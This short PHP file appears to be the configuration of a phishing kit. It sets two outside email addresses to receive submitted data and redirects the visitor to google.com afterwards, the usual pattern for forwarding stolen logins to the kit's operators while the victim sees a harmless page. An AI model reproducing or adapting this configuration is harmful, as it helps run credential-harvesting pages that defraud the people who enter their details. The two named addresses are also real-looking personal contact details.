<?php 
$Receive_email="johnwright365@outlook.com, ajeboajebo1@zohomail.com";
$redirect="https://www.google.com/";
?>